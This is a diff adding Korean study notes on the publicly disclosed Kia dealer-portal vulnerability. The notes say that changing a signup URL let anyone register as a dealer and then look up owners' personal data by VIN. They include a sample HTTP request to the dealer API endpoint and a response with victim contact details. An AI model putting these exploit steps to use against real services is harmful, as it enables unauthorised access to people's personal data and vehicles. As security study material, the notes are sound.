@@ -4556,4 +4556,72 @@ print(f"최소 총 점수: {cost_matrix[row_ind, col_ind].sum()}")
 - 그러다가 vector4 _TopColor 이후 다시 4가 증가
 - 정상작동할 때는 288byte로 vector4가 16씩 증가하고 이후 float에서 4씩 순서대로 잘 들어간다
 
+---
 
+[(9) 요즘 차는 번호판만 찍으면 문딸 수 있음](https://www.youtube.com/watch?v=WwYl0ik2zDI)
+
+- [Hacking Kia: Remotely Controlling Cars With Just a License Plate](https://samcurry.net/hacking-kia)
+
+자동차 딜러들은 고객 정보에 접근할 수 있는 시스템에 취약점이 발견됨(현재는 패치돼어 막힌 상태)
+
+![image_2024-11-07-00-06-03](img/image_2024-11-07-00-06-03.png)
+
+![image_2024-11-06-23-57-15](img/image_2024-11-06-23-57-15.png)
+
+- Dealer 가입 절차에는 따로 방어 백엔드 방어 로직이 따로 없었던 상태
+- 회원가입 요청 url 을 `owners.kia.com` -> `kiaconnect.kdealer.com` 으로 수정하는 것만으로도 누구나 딜러로 회원가입이 가능
+
+![image_2024-11-07-00-00-56](img/image_2024-11-07-00-00-56.png)
+
+- 획득한 dealer 계정으로 로그인한다면 `dec/dlr/dvl` url 로 차대번호를 넣어 요청하면 고객 정보가 응답으로 돌아온다.
+  - 이때 차대번호는 차 번호판을 보고 추론 가능하다고 함
+
+![image_2024-11-07-00-02-23](img/image_2024-11-07-00-02-23.png)
+
+> HTTP Request to Search VIN using Kia Dealer APIGW Endpoint (with “dda” access token)
+
+```json
+POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
+Host: kiaconnect.kdealer.com
+Appid: 123e4567-e89b-12d3-a456-426614174000
+Apiurl: /dec/dlr/dvl
+
+{
+    "vin": "1HGBH41JXMN109186"
+}
+```
+
+> HTTP Response
+
+```json
+HTTP/1.1 200 OK
+Content-type: application/json
+
+{
+  "payload": {
+    "billingSubscriptionSupported": 1,
+    "digitalKeySupported": 0,
+    "generation": "3",
+    "profiles": [
+      {
+        "address": {},
+        "billSubscriptionStatus": 1,
+        "digitalKeyStatus": 0,
+        "email": "victim@gmail.com",
+        "enrollmentReqStatus": 1,
+        "enrollmentStatus": 1,
+        "firstName": "yeet",
+        "lastName": "yeet",
+        "loginId": "victim@gmail.com",
+        "phone": "4027181388",
+        "phoneType": 3,
+        "wifiHotspotStatus": 0
+      }
+    ],
+    "vinAddedToAccount": 1,
+    "wifiHotspotSupported": 1
+  }
+}
+```
+
+- 기아 뿐만 아니라 BMW, benz, toyota 등 딜러에게 많은 권한이 있기 때문에 취약점이 발견된 사례가 있다.
